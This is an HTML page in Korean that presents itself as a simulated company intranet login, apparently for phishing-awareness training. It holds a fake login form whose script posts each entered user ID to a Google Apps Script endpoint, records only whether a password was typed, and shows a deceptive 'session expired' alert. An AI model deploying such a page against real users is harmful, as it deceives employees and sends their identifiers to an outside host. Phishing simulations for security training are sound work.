<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <title>사내 시스템 로그인 (시뮬레이션)</title>
</head>
<body>

    <h2>사내 인트라넷 로그인</h2>
    <form id="phishingForm">
        <input type="text" id="userId" placeholder="사번 또는 아이디" required><br><br>
        <input type="password" id="userPw" placeholder="비밀번호" required><br><br>
        <button type="submit">로그인</button>
    </form>

    <script>
        document.getElementById('phishingForm').addEventListener('submit', function(e) {
            e.preventDefault(); // 페이지 새로고침 방지

            // 사용자가 입력한 값 가져오기
            var userId = document.getElementById('userId').value;
            var userPw = document.getElementById('userPw').value;
            
            // 비밀번호는 길이에 따라 O, X로만 판별 (실제 값은 버림)
            var isPwEntered = userPw.length > 0 ? 'O' : 'X';
            
            // ★ 여기에 아까 2단계에서 복사한 '웹 앱 URL'을 넣어줘! ★
            var gasUrl = 'https://script.google.com/macros/s/AKfycbxx3xoV30Fq8UB4bCDtSLXRwsWkFOEjt-fm2cw9w7mqufJCTN6THnQCUnBRhhwgAHAgKA/exec';

            // 폼 데이터 형태로 포장
            var formData = new FormData();
            formData.append('userId', userId);
            formData.append('isPwEntered', isPwEntered);

            // 구글 시트로 데이터 전송
            fetch(gasUrl, {
                method: 'POST',
                body: formData
            }).then(response => {
                // 전송이 끝나면 깜빡 속도록 가짜 에러 메시지 띄우기
                alert('세션이 만료되었습니다. 다시 시도해주세요.');
                window.location.reload(); 
            }).catch(error => {
                console.error('Error:', error);
            });
        });
    </script>

</body>
</html>
